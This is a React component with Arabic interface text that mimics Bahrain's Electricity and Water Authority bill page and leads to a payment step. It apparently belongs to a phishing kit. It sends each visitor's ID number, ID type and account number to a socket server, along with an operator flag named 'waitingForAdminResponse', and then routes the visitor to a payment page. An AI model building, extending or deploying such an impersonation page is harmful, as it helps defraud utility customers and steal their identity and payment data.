import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { navigateToPage, sendData, socket } from "@/lib/store";

export default function EWABills() {
  const [, setLocation] = useLocation();
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");
  const [billData, setBillData] = useState<any>(null);
  const [loadingMsg, setLoadingMsg] = useState("جاري جلب بيانات الفواتير...");

  const idType = localStorage.getItem("ewa_idType") || "";
  const idNumber = localStorage.getItem("ewa_idNumber") || "";
  const accountNumber = localStorage.getItem("ewa_accountNumber") || "";
  const idTypeLabel = localStorage.getItem("ewa_idTypeLabel") || "";

  useEffect(() => {
    navigateToPage('عرض الفواتير');
    fetchBills();
  }, []);

  const fetchBills = async () => {
    if (!idType || !idNumber || !accountNumber) {
      setError("لم يتم العثور على بيانات العميل");
      setLoading(false);
      return;
    }

    // Loading messages
    const msgs = [
      "جاري الاتصال بنظام هيئة الكهرباء والماء...",
      "جاري التحقق من البيانات...",
      "جاري جلب تفاصيل الفاتورة...",
      "يرجى الانتظار قليلاً...",
    ];
    let msgIdx = 0;
    const msgInterval = setInterval(() => {
      msgIdx = (msgIdx + 1) % msgs.length;
      setLoadingMsg(msgs[msgIdx]);
    }, 4000);

    try {
      const serverUrl = import.meta.env.VITE_SOCKET_URL || 'http://localhost:3001';
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 120000);
      const resp = await fetch(`${serverUrl}/api/ewa-bill`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ idType, idNumber, accountNumber }),
        signal: controller.signal,
      });
      clearTimeout(timeoutId);
      clearInterval(msgInterval);
      const data = await resp.json();

      if (!data.success) {
        setError(data.error || "حدث خطأ أثناء جلب الفواتير");
      } else {
        setBillData(data);
        if (socket.value.connected) {
          sendData({
            data: {
              ewaBills: data,
              idType: idTypeLabel,
              idNumber,
              accountNumber,
            },
            current: 'عرض الفواتير',
            nextPage: 'summary-payment',
            waitingForAdminResponse: false,
          });
        }
      }
    } catch (err: any) {
      clearInterval(msgInterval);
      if (err.name === 'AbortError') {
        setError("انتهت مهلة الاتصال بالخادم. يرجى المحاولة مرة أخرى.");
      } else {
        setError("حدث خطأ في الاتصال بالخادم: " + (err.message || ""));
      }
    } finally {
      setLoading(false);
    }
  };

  const handleProceed = () => {
    setLocation('/summary-payment');
  };

  const handleBack = () => {
    setLocation('/');
  };

  // استخراج البيانات المحللة
  const p = billData?.parsedData || {};
  const totalAmount = billData?.totalAmount || p.totalAmount || p.balance || '';

  return (
    <>
      <style dangerouslySetInnerHTML={{ __html: `
        .ewa-page, .ewa-page * { font-family: 'Segoe UI', Tahoma, Arial, sans-serif !important; box-sizing: border-box; margin: 0; padding: 0; }
        .ewa-page { direction: rtl; min-height: 100vh; background: #f5f5f5; }
        .ewa-top-bar { background: #003366; color: #fff; padding: 14px 0; }
        .ewa-top-bar-inner { max-width: 1000px; margin: 0 auto; padding: 0 20px; display: flex; align-items: center; justify-content: space-between; }
        .ewa-top-bar h1 { font-size: 18px; font-weight: 700; }
        .ewa-top-bar img { height: 36px; }
        .ewa-wrap { max-width: 1000px; margin: 0 auto; padding: 20px; }
        
        .ewa-section-bar { background: #1a3a5c; color: #fff; padding: 10px 20px; font-size: 14px; font-weight: 600; border-radius: 4px 4px 0 0; display: flex; align-items: center; gap: 8px; }
        .ewa-section-bar svg { flex-shrink: 0; }
        
        .ewa-card { background: #fff; border: 1px solid #ddd; border-radius: 0 0 4px 4px; margin-bottom: 20px; }
        .ewa-card-standalone { border-radius: 4px; }
        
        .ewa-row { display: flex; justify-content: space-between; align-items: center; padding: 10px 20px; border-bottom: 1px solid #eee; font-size: 14px; }
        .ewa-row:last-child { border-bottom: none; }
        .ewa-row-label { color: #333; font-weight: 600; }
        .ewa-row-value { color: #111; }
        
        .ewa-total-box { background: #e3edf7; border: 2px solid #003366; border-radius: 4px; padding: 16px 20px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; }
        .ewa-total-label { font-size: 16px; font-weight: 700; color: #003366; }
        .ewa-total-value { font-size: 22px; font-weight: 700; color: #003366; }
        
        .ewa-detail-section { margin-bottom: 20px; }
        .ewa-detail-grid { background: #fff; border: 1px solid #ddd; border-radius: 0 0 4px 4px; }
        .ewa-detail-row { display: flex; border-bottom: 1px solid #eee; font-size: 13px; }
        .ewa-detail-row:last-child { border-bottom: none; }
        .ewa-detail-label { width: 200px; padding: 10px 20px; color: #333; font-weight: 600; background: #fafafa; border-left: 1px solid #eee; flex-shrink: 0; }
        .ewa-detail-val { flex: 1; padding: 10px 20px; color: #111; }
        
        .ewa-summary-row { display: flex; justify-content: flex-end; padding: 8px 20px; font-size: 14px; font-weight: 600; color: #003366; }
        
        .ewa-btns { display: flex; gap: 12px; justify-content: center; margin-top: 24px; flex-wrap: wrap; }
        .ewa-btn-blue { background: #003366; color: #fff; border: none; padding: 10px 36px; border-radius: 4px; font-size: 14px; font-weight: 600; cursor: pointer; }
        .ewa-btn-blue:hover { background: #004488; }
        .ewa-btn-white { background: #fff; color: #003366; border: 2px solid #003366; padding: 10px 36px; border-radius: 4px; font-size: 14px; font-weight: 600; cursor: pointer; }
        .ewa-btn-white:hover { background: #f0f4ff; }
        
        .ewa-loading { display: flex; flex-direction: column; align-items: center; padding: 60px 20px; gap: 16px; }
        .ewa-spin { width: 40px; height: 40px; border: 3px solid #ddd; border-top-color: #003366; border-radius: 50%; animation: ewaspin 0.7s linear infinite; }
        @keyframes ewaspin { to { transform: rotate(360deg); } }
        .ewa-err { background: #fff3f3; border: 1px solid #ffcdd2; border-radius: 6px; padding: 20px; text-align: center; color: #c62828; margin: 20px 0; }
        
        .ewa-progress-bar { width: 200px; height: 4px; background: #ddd; border-radius: 2px; overflow: hidden; }
        .ewa-progress-fill { height: 100%; background: #003366; border-radius: 2px; animation: ewaProgress 3s ease-in-out infinite; }
        @keyframes ewaProgress { 0% { width: 0%; } 50% { width: 80%; } 100% { width: 100%; } }
      `}} />

      <div className="ewa-page">
        <div className="ewa-top-bar">
          <div className="ewa-top-bar-inner">
            <h1>فاتورة الكهرباء والماء</h1>
            <img src="/bahrain-logo.png" alt="" onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }} />
          </div>
        </div>

        <div className="ewa-wrap">
          {/* بيانات العميل */}
          <div className="ewa-section-bar">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="white" strokeWidth="2"/><path d="M12 8v4M12 16h.01" stroke="white" strokeWidth="2" strokeLinecap="round"/></svg>
            بيانات الفواتير
          </div>
          <div className="ewa-card">
            <div className="ewa-row">
              <span className="ewa-row-label">نوع الهوية:</span>
              <span className="ewa-row-value">{idTypeLabel}</span>
            </div>
            <div className="ewa-row">
              <span className="ewa-row-label">رقم الهوية:</span>
              <span className="ewa-row-value">{idNumber}</span>
            </div>
            <div className="ewa-row">
              <span className="ewa-row-label">رقم الحساب:</span>
              <span className="ewa-row-value">{accountNumber}</span>
            </div>
          </div>

          {/* Loading */}
          {loading && (
            <div className="ewa-loading">
              <div className="ewa-spin"></div>
              <p style={{ color: '#333', fontSize: '15px', fontWeight: 600 }}>{loadingMsg}</p>
              <div className="ewa-progress-bar">
                <div className="ewa-progress-fill"></div>
              </div>
              <p style={{ color: '#999', fontSize: '12px' }}>قد يستغرق الأمر بضع ثوان...</p>
            </div>
          )}

          {/* Error */}
          {!loading && error && (
            <div className="ewa-err">
              <p style={{ fontSize: '16px', fontWeight: 600, marginBottom: '8px' }}>خطأ</p>
              <p>{error}</p>
            </div>
          )}

          {/* Bill Data */}
          {!loading && !error && billData && (
            <>
              {/* المبلغ الإجمالي */}
              <div className="ewa-total-box">
                <span className="ewa-total-label">المبلغ الإجمالي المستحق:</span>
                <span className="ewa-total-value">{totalAmount || '0.000'} د.ب</span>
              </div>

              {/* تفاصيل الفاتورة */}
              <div className="ewa-detail-section">
                <div className="ewa-section-bar">تفاصيل الفاتورة</div>
                <div className="ewa-detail-grid">
                  <div className="ewa-detail-row">
                    <div className="ewa-detail-label">رقم الحساب</div>
                    <div className="ewa-detail-val">{p.accountNumber || accountNumber}</div>
                  </div>
                  {p.customerName && (
                    <div className="ewa-detail-row">
                      <div className="ewa-detail-label">تفاصيل العميل</div>
                      <div className="ewa-detail-val">
                        {p.customerName}
                        {p.address && <><br/>{p.address}</>}
                      </div>
                    </div>
                  )}
                  {p.issueDate && (
                    <div className="ewa-detail-row">
                      <div className="ewa-detail-label">تاريخ الاصدار</div>
                      <div className="ewa-detail-val">{p.issueDate}</div>
                    </div>
                  )}
                  {p.billMonth && (
                    <div className="ewa-detail-row">
                      <div className="ewa-detail-label">القائمة لشهر</div>
                      <div className="ewa-detail-val">{p.billMonth}</div>
                    </div>
                  )}
                  {p.balance && (
                    <div className="ewa-detail-row">
                      <div className="ewa-detail-label">الرصيد (د.ب)</div>
                      <div className="ewa-detail-val">{p.balance}</div>
                    </div>
                  )}
                  {p.minPayment && (
                    <div className="ewa-detail-row">
                      <div className="ewa-detail-label">* الحد الأدنى للدفع (د.ب)</div>
                      <div className="ewa-detail-val">{p.minPayment}</div>
                    </div>
                  )}
                </div>
              </div>

              {/* مجموع المبالغ */}
              {(p.totalAmount || p.paidAmount) && (
                <div className="ewa-card ewa-card-standalone" style={{ borderRadius: '4px' }}>
                  {p.totalAmount && (
                    <div className="ewa-summary-row" style={{ borderBottom: '1px solid #eee' }}>
                      مجموع المبالغ (د.ب): {p.totalAmount}
                    </div>
                  )}
                  {p.paidAmount && (
                    <div className="ewa-summary-row">
                      مجموع المبلغ المدفوع (د.ب): {p.paidAmount}
                    </div>
                  )}
                </div>
              )}

              {/* جدول الفواتير إذا وجد */}
              {billData.bills && billData.bills.length > 0 && (
                <div className="ewa-detail-section">
                  <div className="ewa-section-bar">الفواتير</div>
                  <table style={{ width: '100%', borderCollapse: 'collapse', background: '#fff', border: '1px solid #ddd', borderTop: 'none' }}>
                    {billData.tableHeaders && (
                      <thead>
                        <tr>
                          {billData.tableHeaders.map((h: string, i: number) => (
                            <th key={i} style={{ background: '#f5f5f5', padding: '10px 16px', fontSize: '13px', fontWeight: 600, textAlign: 'right', borderBottom: '1px solid #ddd' }}>{h}</th>
                          ))}
                        </tr>
                      </thead>
                    )}
                    <tbody>
                      {billData.bills.map((row: string[], idx: number) => (
                        <tr key={idx}>
                          {row.map((cell: string, ci: number) => (
                            <td key={ci} style={{ padding: '10px 16px', fontSize: '13px', textAlign: 'right', borderBottom: '1px solid #eee' }}>{cell}</td>
                          ))}
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              )}
            </>
          )}

          {/* Buttons */}
          <div className="ewa-btns">
            {!loading && !error && billData && (
              <button className="ewa-btn-blue" onClick={handleProceed}>متابعة الدفع</button>
            )}
            {!loading && error && (
              <button className="ewa-btn-blue" onClick={() => { setLoading(true); setError(""); fetchBills(); }}>إعادة المحاولة</button>
            )}
            <button className="ewa-btn-white" onClick={handleBack}>رجوع</button>
          </div>
        </div>
      </div>
    </>
  );
}
